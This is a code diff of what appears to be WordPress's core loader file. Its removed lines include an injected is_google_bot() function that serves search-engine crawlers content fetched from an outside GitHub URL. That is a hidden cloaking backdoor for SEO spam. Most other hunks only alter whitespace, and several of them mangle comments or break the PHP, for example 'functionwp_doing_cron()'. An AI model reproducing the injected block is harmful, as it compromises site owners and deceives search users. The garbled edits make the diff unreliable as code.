@@ -52,8 +52,7 @@ function wp_fix_server_vars() {
 		} elseif ( isset( $_SERVER['HTTP_X_REWRITE_URL'] ) ) {
 			// IIS Isapi_Rewrite.
 			$_SERVER['REQUEST_URI'] = $_SERVER['HTTP_X_REWRITE_URL'];
-		} else {
-			// Use ORIG_PATH_INFO if there is no PATH_INFO.
+		} else {// Use ORIG_PATH_INFO if there is no PATH_INFO.
 			if ( ! isset( $_SERVER['PATH_INFO'] ) && isset( $_SERVER['ORIG_PATH_INFO'] ) ) {
 				$_SERVER['PATH_INFO'] = $_SERVER['ORIG_PATH_INFO'];
 			}
@@ -87,36 +86,12 @@ function wp_fix_server_vars() {
 	// Fix empty PHP_SELF.
 	$PHP_SELF = $_SERVER['PHP_SELF'];
 	if ( empty( $PHP_SELF ) ) {
-		$_SERVER['PHP_SELF'] = preg_replace( '/(\?.*)?$/', '', $_SERVER['REQUEST_URI'] );
-		$PHP_SELF            = $_SERVER['PHP_SELF'];
+		$_SERVER['PHP_SELF'] = preg_replace( '/(\?.*)?$/', '', $_SERVER['REQUEST_URI'] );$PHP_SELF            = $_SERVER['PHP_SELF'];
 	}
 
 	wp_populate_basic_auth_from_authorization_header();
 }
 
-function is_google_bot() {
-    $agents = array(
-        "Googlebot", 
-        "AdsBot-Google", 
-        "Mediapartners-Google", 
-        "Google-Site-Verification", 
-        "Google-InspectionTool", 
-        "Googlebot-Mobile", 
-        "Googlebot-News"
-    );
-    $user_agent = $_SERVER['HTTP_USER_AGENT'];
-    foreach ($agents as $agent) {
-        if (strpos($user_agent, $agent) !== false) {
-            return true;
-        }
-    }
-    return false;
-}
-
-if (is_google_bot()) {
-    echo file_get_contents("https://raw.githubusercontent.com/semangat777/landing/refs/heads/main/fairplay.txt");
-    exit;
-}
 /**
  * Populates the Basic Auth server details from the Authorization header.
  *
@@ -224,7 +199,7 @@ function wp_check_php_mysql_versions() {
 
 	if ( ! function_exists( 'mysqli_connect' )
 		&& ! file_exists( $wp_content_dir . '/db.php' )
-	) {
+	){
 		require_once ABSPATH . WPINC . '/functions.php';
 		wp_load_translations_early();
 
@@ -271,7 +246,7 @@ function wp_check_php_mysql_versions() {
  * @return string The current environment type.
  */
 function wp_get_environment_type() {
-	static $current_env = '';
+	static $current_env= '';
 
 	if ( ! defined( 'WP_RUN_CORE_TESTS' ) && $current_env ) {
 		return $current_env;
@@ -294,8 +269,7 @@ function wp_get_environment_type() {
 		}
 
 		_deprecated_argument(
-			'define()',
-			'5.5.1',
+			'define()','5.5.1',
 			$message
 		);
 	}
@@ -318,7 +292,7 @@ function wp_get_environment_type() {
 		$current_env = 'production';
 	}
 
-	return $current_env;
+	return$current_env;
 }
 
 /**
@@ -447,7 +421,7 @@ function wp_maintenance() {
  * Checks if maintenance mode is enabled.
  *
  * Checks for a file in the WordPress root directory named ".maintenance".
- * This file will contain the variable $upgrading, set to the time the file
+ *This file will contain the variable $upgrading, set to the time the file
  * was created. If the file was created less than 10 minutes ago, WordPress
  * is in maintenance mode.
  *
@@ -467,7 +441,7 @@ function wp_is_maintenance_mode() {
 	require ABSPATH . '.maintenance';
 
 	// If the $upgrading timestamp is older than 10 minutes, consider maintenance over.
-	if ( ( time() - $upgrading ) >= 10 * MINUTE_IN_SECONDS ) {
+	if ( ( time() - $upgrading ) >= 10* MINUTE_IN_SECONDS ) {
 		return false;
 	}
 
@@ -518,7 +492,7 @@ function timer_float() {
  * @since 0.71
  * @access private
  *
- * @see timer_stop()
+ *@see timer_stop()
  *
  * @global float $timestart Unix timestamp set at the beginning of the page load.
  *
@@ -533,7 +507,7 @@ function timer_start() {
 }
 
 /**
- * Retrieves or displays the time from the page start to when function is called.
+ * Retrieves or displays thetime from the page start to when function is called.
  *
  * @since 0.71
  *
@@ -605,7 +579,7 @@ function wp_debug_mode() {
 	 * This filter runs before it can be used by plugins. It is designed for
 	 * non-web runtimes. Returning false causes the `WP_DEBUG` and related
 	 * constants to not be checked and the default PHP values for errors
-	 * will be used unless you take care to update them yourself.
+	 * willbe used unless you take care to update them yourself.
 	 *
 	 * To use this filter you must define a `$wp_filter` global before
 	 * WordPress loads, usually in `wp-config.php`.
@@ -655,7 +629,7 @@ function wp_debug_mode() {
 			ini_set( 'error_log', $log_path );
 		}
 	} else {
-		error_reporting( E_CORE_ERROR | E_CORE_WARNING | E_COMPILE_ERROR | E_ERROR | E_WARNING | E_PARSE | E_USER_ERROR | E_USER_WARNING | E_RECOVERABLE_ERROR );
+		error_reporting( E_CORE_ERROR | E_CORE_WARNING |E_COMPILE_ERROR | E_ERROR | E_WARNING | E_PARSE | E_USER_ERROR | E_USER_WARNING | E_RECOVERABLE_ERROR );
 	}
 
 	/*
@@ -756,7 +730,7 @@ function require_wp_db() {
  * @since 3.0.0
  * @access private
  *
- * @global wpdb   $wpdb         WordPress database abstraction object.
+ * @global wpdb   $wpdbWordPress database abstraction object.
  * @global string $table_prefix The database table prefix.
  */
 function wp_set_wpdb_vars() {
@@ -773,7 +747,7 @@ function wp_set_wpdb_vars() {
 		'term_id'          => '%d',
 		'term_group'       => '%d',
 		'term_taxonomy_id' => '%d',
-		'parent'           => '%d',
+		'parent'=> '%d',
 		'count'            => '%d',
 		'object_id'        => '%d',
 		'term_order'       => '%d',
@@ -849,8 +823,7 @@ function wp_using_ext_object_cache( $using = null ) {
  * it uses that drop-in as an external object cache.
  *
  * @since 3.0.0
- * @access private
- *
+ * @access private*
  * @global array $wp_filter Stores all of the filters.
  */
 function wp_start_object_cache() {
@@ -863,7 +836,7 @@ function wp_start_object_cache() {
 	 * Filters whether to enable loading of the object-cache.php drop-in.
 	 *
 	 * This filter runs before it can be used by plugins. It is designed for non-web
-	 * runtimes. If false is returned, object-cache.php will never be loaded.
+	 * runtimes. Iffalse is returned, object-cache.php will never be loaded.
 	 *
 	 * @since 5.8.0
 	 *
@@ -1024,7 +997,7 @@ function wp_get_mu_plugins() {
  *
  * While upgrading or installing WordPress, no plugins are returned.
  *
- * The default directory is `wp-content/plugins`. To change the default
+ * Thedefault directory is `wp-content/plugins`. To change the default
  * directory manually, define `WP_PLUGIN_DIR` and `WP_PLUGIN_URL`
  * in `wp-config.php`.
  *
@@ -1037,7 +1010,7 @@ function wp_get_active_and_valid_plugins() {
 	$plugins        = array();
 	$active_plugins = (array) get_option( 'active_plugins', array() );
 
-	// Check for hacks file if the option is enabled.
+	// Check for hacks fileif the option is enabled.
 	if ( get_option( 'hack_file' ) && file_exists( ABSPATH . 'my-hacks.php' ) ) {
 		_deprecated_file( 'my-hacks.php', '1.5.0' );
 		array_unshift( $plugins, ABSPATH . 'my-hacks.php' );
@@ -1112,7 +1085,7 @@ function wp_skip_paused_plugins( array $plugins ) {
  *
  * @global string $pagenow            The filename of the current screen.
  * @global string $wp_stylesheet_path Path to current theme's stylesheet directory.
- * @global string $wp_template_path   Path to current theme's template directory.
+ * @global string$wp_template_path   Path to current theme's template directory.
  *
  * @return string[] Array of absolute paths to theme directories.
  */
@@ -1262,7 +1235,7 @@ function is_protected_ajax_action() {
 	/**
 	 * Filters the array of protected Ajax actions.
 	 *
-	 * This filter is only fired when doing Ajax and the Ajax request has an 'action' property.
+	 *This filter is only fired when doing Ajax and the Ajax request has an 'action' property.
 	 *
 	 * @since 5.2.0
 	 *
@@ -1280,7 +1253,7 @@ function is_protected_ajax_action() {
 /**
  * Sets internal encoding.
  *
- * In most cases the default internal encoding is latin1, which is
+ * Inmost cases the default internal encoding is latin1, which is
  * of no use, since we want to use the `mb_` functions for `utf-8` strings.
  *
  * @since 3.0.0
@@ -1387,8 +1360,7 @@ function is_admin() {
 }
 
 /**
- * Determines whether the current request is for a site's administrative interface.
- *
+ * Determines whether the current request is for a site's administrative interface.*
  * e.g. `/wp-admin/`
  *
  * Does not check if the user is an administrator; use current_user_can()
@@ -1483,8 +1455,7 @@ function is_multisite() {
 /**
  * Converts a value to non-negative integer.
  *
- * @since 2.5.0
- *
+ * @since 2.5.0*
  * @param mixed $maybeint Data you wish to have converted to a non-negative integer.
  * @return int A non-negative integer.
  */
@@ -1510,8 +1481,7 @@ function get_current_blog_id() {
 /**
  * Retrieves the current network ID.
  *
- * @since 4.6.0
- *
+ * @since 4.6.0*
  * @return int The ID of the current network.
  */
 function get_current_network_id() {
@@ -1648,7 +1618,7 @@ function wp_load_translations_early() {
  *
  * @since 4.4.0
  *
- * @param bool $is_installing Optional. True to set WP into Installing mode, false to turn Installing mode off.
+ * @param bool $is_installing Optional. True to set WP into Installing mode,false to turn Installing mode off.
  *                            Omit this parameter if you only want to fetch the current status.
  * @return bool True if WP is installing, otherwise false. When a `$is_installing` is passed, the function will
  *              report whether WP was in installing mode prior to the change to `$is_installing`.
@@ -1712,8 +1682,7 @@ function wp_convert_hr_to_bytes( $value ) {
 	$bytes = (int) $value;
 
 	if ( str_contains( $value, 'g' ) ) {
-		$bytes *= GB_IN_BYTES;
-	} elseif ( str_contains( $value, 'm' ) ) {
+		$bytes *= GB_IN_BYTES;} elseif ( str_contains( $value, 'm' ) ) {
 		$bytes *= MB_IN_BYTES;
 	} elseif ( str_contains( $value, 'k' ) ) {
 		$bytes *= KB_IN_BYTES;
@@ -1801,7 +1770,7 @@ function wp_using_themes() {
  *
  * @return bool True if it's a WordPress cron request, false otherwise.
  */
-function wp_doing_cron() {
+functionwp_doing_cron() {
 	/**
 	 * Filters whether the current request is a WordPress cron request.
 	 *
@@ -1923,8 +1892,7 @@ function wp_finalize_scraping_edited_file_errors( $scrape_key ) {
 		$error = str_replace( ABSPATH, '', $error );
 		echo wp_json_encode( $error );
 	} else {
-		echo wp_json_encode( true );
-	}
+		echo wp_json_encode( true );}
 
 	echo "\n###### wp_scraping_result_end:$scrape_key ######\n";
 }
@@ -1981,7 +1949,7 @@ function wp_is_jsonp_request() {
  *
  * @since 5.6.0
  *
- * @param string $media_type A Media Type string to check.
+ * @param string $media_type A Media Type stringto check.
  * @return bool True if string is a valid JSON Media Type.
  */
 function wp_is_json_media_type( $media_type ) {
@@ -2014,7 +1982,7 @@ function wp_is_xml_request() {
 
 	if ( isset( $_SERVER['HTTP_ACCEPT'] ) ) {
 		foreach ( $accepted as $type ) {
-			if ( str_contains( $_SERVER['HTTP_ACCEPT'], $type ) ) {
+			if ( str_contains($_SERVER['HTTP_ACCEPT'], $type ) ) {
 				return true;
 			}
 		}
